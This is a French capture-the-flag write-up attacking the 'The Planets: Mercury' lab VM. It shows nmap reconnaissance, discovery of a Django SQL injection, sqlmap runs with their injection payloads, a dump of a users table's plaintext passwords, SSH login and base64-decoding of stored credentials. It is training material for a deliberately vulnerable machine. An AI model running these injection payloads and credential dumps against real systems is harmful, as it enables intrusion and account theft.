# The Planets : Mercury par SirFlash

Cette machine virtuelle est décrite comme facile, elle ne nécessite pas de brute force. Il faut trouver un flag user et un flag root qui contiennent chacun un hash MD5.

Sommaire de cet article :
* [Analyse](#analyse)
  * [Recherche de l'adresse IP de la machine virtuelle](#recherche_ip)
  * [Recherche d'un point d'entrée](#recherche_pe)
    * [Recherche avec nmap](#recherche_nmap)
    * [Analyse du port 8080](#analyse_8080)
* [Exploitation](#exploitation)

## Analyse<a name="analyse"></a>
Je vais dans un premier temps récupérer l'adresse IP de la machine virtuelle puis analyser celle-ci dans le but de trouver un point d'entrée.

### Recherche de l'adresse IP de la machine virtuelle<a name="recherche_ip"></a>
Pour récupérer l'adresse IP de la machine virtuelle, j'exécute la commande ```sudo netdiscover -i eth1 -r 192.168.56.0/24``` et je récupère son adresse : 192.168.56.103

### Recherche d'un point d'entrée<a name="recherche_pe"></a>
Je commence ma recherche afin de trouver un point d'entrée.

#### Recherche avec nmap<a name="recherche_nmap"></a>
Je lance une analyse avec la commande ```nmap -e eth1 -A -p- -T4 192.168.56.103``` :
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-26 11:29 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.103
Host is up (0.0024s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)
|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)
|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Wed, 26 Jan 2022 16:29:44 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 2366
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align:
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 26 Jan 2022 16:29:44 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Content-Length: 69
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Hello. This site is currently in development please check back later.
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: WSGIServer/0.2 CPython/3.8.2
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=1/26%Time=61F176FA%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,135,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2026\x20Jan\x202
SF:022\x2016:29:44\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8\.2
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\x2
SF:0DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nosniff\r\
SF:nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\x20is\x
SF:20currently\x20in\x20development\x20please\x20check\x20back\x20later\."
SF:)%r(HTTPOptions,135,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2026\x20J
SF:an\x202022\x2016:29:44\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/
SF:3\.8\.2\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Opti
SF:ons:\x20DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nos
SF:niff\r\nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\
SF:x20is\x20currently\x20in\x20development\x20please\x20check\x20back\x20l
SF:ater\.")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DT
SF:D\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\
SF:.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20cont
SF:ent=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<titl
SF:e>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<
SF:body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP/
SF:1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20expl
SF:anation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x2
SF:0or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n"
SF:)%r(FourOhFourRequest,A28,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x2
SF:0Wed,\x2026\x20Jan\x202022\x2016:29:44\x20GMT\r\nServer:\x20WSGIServer/
SF:0\.2\x20CPython/3\.8\.2\r\nContent-Type:\x20text/html\r\nX-Frame-Option
SF:s:\x20DENY\r\nContent-Length:\x202366\r\nX-Content-Type-Options:\x20nos
SF:niff\r\nReferrer-Policy:\x20same-origin\r\n\r\n<!DOCTYPE\x20html>\n<htm
SF:l\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20http-equiv=\"content-type\"
SF:\x20content=\"text/html;\x20charset=utf-8\">\n\x20\x20<title>Page\x20no
SF:t\x20found\x20at\x20/nice\x20ports,/Trinity\.txt\.bak</title>\n\x20\x20
SF:<meta\x20name=\"robots\"\x20content=\"NONE,NOARCHIVE\">\n\x20\x20<style
SF:\x20type=\"text/css\">\n\x20\x20\x20\x20html\x20\*\x20{\x20padding:0;\x
SF:20margin:0;\x20}\n\x20\x20\x20\x20body\x20\*\x20{\x20padding:10px\x2020
SF:px;\x20}\n\x20\x20\x20\x20body\x20\*\x20\*\x20{\x20padding:0;\x20}\n\x2
SF:0\x20\x20\x20body\x20{\x20font:small\x20sans-serif;\x20background:#eee;
SF:\x20color:#000;\x20}\n\x20\x20\x20\x20body>div\x20{\x20border-bottom:1p
SF:x\x20solid\x20#ddd;\x20}\n\x20\x20\x20\x20h1\x20{\x20font-weight:normal
SF:;\x20margin-bottom:\.4em;\x20}\n\x20\x20\x20\x20h1\x20span\x20{\x20font
SF:-size:60%;\x20color:#666;\x20font-weight:normal;\x20}\n\x20\x20\x20\x20
SF:table\x20{\x20border:none;\x20border-collapse:\x20collapse;\x20width:10
SF:0%;\x20}\n\x20\x20\x20\x20td,\x20th\x20{\x20vertical-align:");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.62 seconds
```

Je constate qu'il y a 2 ports ouverts :
* 22/tcp (ssh) : OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
* 8080/tcp (http-proxy) : WSGIServer/0.2 CPython/3.8.2

#### Analyse du port 8080<a name="analyse_8080"></a>

Avec la commande ```dirb http://192.168.56.103:8080``` je trouve la présence d'un fichier ```robots.txt``` mais celui-ci ne contient rien...

En voulant visiter l'adresse ```http://192.168.56.103:8080/admin```, j'arrive sur une page d'erreur me donnant des informations intéressantes :
```
Using the URLconf defined in mercury_proj.urls, Django tried these URL patterns, in this order:

    [name='index']
    robots.txt [name='robots']
    mercuryfacts/

The current path, admin, didn't match any of these.
```

Je vais donc aller visiter cette page : ```http://192.168.56.103:8080/mercuryfacts/```.

J'essaie à nouveau d'accéder à une éventuelle page d'administration : ```http://192.168.56.103:8080/mercuryfacts/admin/```.

Je tombe à nouveau sur une page d'erreur riche en information dont : ```(1054, "Unknown column 'admin' in 'where clause'")``` et ```cursor.execute('SELECT fact FROM facts WHERE id = ' + fact_id)```

Je pense que je suis en présence d'une possible faille d'injection SQL via cette adresse : ```http://192.168.56.103:8080/mercuryfacts/1/```

Je lance donc une recherche en ce sens : ```http://192.168.56.103:8080/mercuryfacts/1```

C'est confirmé :
```
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[)]_____ ___ ___  {1.6#stable}                                                                                                                                                                                                      
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:30:06 /2022-01-27/

[09:30:06] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] 
[09:30:08] [INFO] testing connection to the target URL
got a 301 redirect to 'http://192.168.56.103:8080/mercuryfacts/1/'. Do you want to follow? [Y/n] 
[09:30:11] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
[09:30:11] [INFO] testing if the target URL content is stable
[09:30:11] [WARNING] URI parameter '#1*' does not appear to be dynamic
[09:30:13] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[09:30:15] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[09:30:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:30:21] [WARNING] reflective value(s) found and filtering out
[09:30:23] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[09:30:23] [INFO] testing 'Generic inline queries'
[09:30:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[09:30:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[09:30:24] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[09:30:24] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[09:30:24] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[09:30:24] [INFO] URI parameter '#1*' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[09:30:24] [INFO] testing 'MySQL inline queries'
[09:30:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[09:30:24] [WARNING] time-based comparison requires larger statistical model, please wait................ (done)                                                                                                                           
[09:30:36] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[09:30:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:30:46] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[09:30:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:30:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:30:46] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[09:30:48] [INFO] target URL appears to have 1 column in query
[09:30:48] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://192.168.56.103:8080/mercuryfacts/1 AND 6969=6969

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: http://192.168.56.103:8080/mercuryfacts/1 AND GTID_SUBSET(CONCAT(0x716b6a6a71,(SELECT (ELT(4523=4523,1))),0x7170627171),4523)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: http://192.168.56.103:8080/mercuryfacts/1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://192.168.56.103:8080/mercuryfacts/1 AND (SELECT 3813 FROM (SELECT(SLEEP(5)))zGhx)

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://192.168.56.103:8080/mercuryfacts/1 UNION ALL SELECT CONCAT(0x716b6a6a71,0x6e61717373496646795145727a61796f5572524c474a424c436642434e546c6f4f4d7a4b6e716f4c,0x7170627171)-- -
---
[09:30:54] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[09:30:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.56.103'

[*] ending @ 09:30:55 /2022-01-27/
```

La commande ```sqlmap http://192.168.56.103:8080/mercuryfacts/1 --dbs``` me donne :
```
available databases [2]:
[*] information_schema
[*] mercury
```

La commande ```sqlmap http://192.168.56.103:8080/mercuryfacts/1 -D mercury --tables``` me donne :
```
Database: mercury
[2 tables]
+-------+
| facts |
| users |
+-------+
```

La commande ```sqlmap http://192.168.56.103:8080/mercuryfacts/1 -D mercury -T users --dump``` me donne :
```
Database: mercury
Table: users
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+
```

C'est avec le dernier compte que j'arrive à me connecter en SSH : ```ssh webmaster@192.168.56.103```

## Exploitation<a name="exploitation"></a>

Le flag utilisateur est rapidement trouvé :
```
webmaster@mercury:~$ ls -al
total 36
drwx------ 4 webmaster webmaster 4096 Sep  2  2020 .
drwxr-xr-x 5 root      root      4096 Aug 28  2020 ..
lrwxrwxrwx 1 webmaster webmaster    9 Sep  1  2020 .bash_history -> /dev/null
-rw-r--r-- 1 webmaster webmaster  220 Aug 27  2020 .bash_logout
-rw-r--r-- 1 webmaster webmaster 3771 Aug 27  2020 .bashrc
drwx------ 2 webmaster webmaster 4096 Aug 27  2020 .cache
drwxrwxr-x 5 webmaster webmaster 4096 Aug 28  2020 mercury_proj
-rw-r--r-- 1 webmaster webmaster  807 Aug 27  2020 .profile
-rw-rw-r-- 1 webmaster webmaster   75 Sep  1  2020 .selected_editor
-rw------- 1 webmaster webmaster   45 Sep  1  2020 user_flag.txt
webmaster@mercury:~$ cat user_flag.txt 
[user_flag_8339915c9a454657bd60ee58776f4ccd]
webmaster@mercury:~$ 
```

Je trouve rapidement un fichier qui contient le mot de passe crypté de l'utilisateur **linuxmaster** :
```
webmaster@mercury:~$ ls -al
total 40
drwx------ 5 webmaster webmaster 4096 Jan 27 17:03 .
drwxr-xr-x 5 root      root      4096 Aug 28  2020 ..
lrwxrwxrwx 1 webmaster webmaster    9 Sep  1  2020 .bash_history -> /dev/null
-rw-r--r-- 1 webmaster webmaster  220 Aug 27  2020 .bash_logout
-rw-r--r-- 1 webmaster webmaster 3771 Aug 27  2020 .bashrc
drwx------ 2 webmaster webmaster 4096 Aug 27  2020 .cache
drwx------ 3 webmaster webmaster 4096 Jan 27 17:03 .gnupg
drwxrwxr-x 5 webmaster webmaster 4096 Aug 28  2020 mercury_proj
-rw-r--r-- 1 webmaster webmaster  807 Aug 27  2020 .profile
-rw-rw-r-- 1 webmaster webmaster   75 Sep  1  2020 .selected_editor
-rw------- 1 webmaster webmaster   45 Sep  1  2020 user_flag.txt
webmaster@mercury:~$ cd mercury_proj/
webmaster@mercury:~/mercury_proj$ ls -al
total 28
drwxrwxr-x 5 webmaster webmaster 4096 Aug 28  2020 .
drwx------ 5 webmaster webmaster 4096 Jan 27 17:03 ..
-rw-r--r-- 1 webmaster webmaster    0 Aug 27  2020 db.sqlite3
-rwxr-xr-x 1 webmaster webmaster  668 Aug 27  2020 manage.py
drwxrwxr-x 6 webmaster webmaster 4096 Sep  1  2020 mercury_facts
drwxrwxr-x 4 webmaster webmaster 4096 Aug 28  2020 mercury_index
drwxrwxr-x 3 webmaster webmaster 4096 Aug 28  2020 mercury_proj
-rw------- 1 webmaster webmaster  196 Aug 28  2020 notes.txt
webmaster@mercury:~/mercury_proj$ cat notes.txt 
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

L'aspect fait penser à du *base64*, c'est parti :
```
webmaster@mercury:~/mercury_proj$ echo "bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK" | base64 -d
mercuryisthesizeof0.056Earths
webmaster@mercury:~/mercury_proj$ echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
mercurymeandiameteris4880km
```

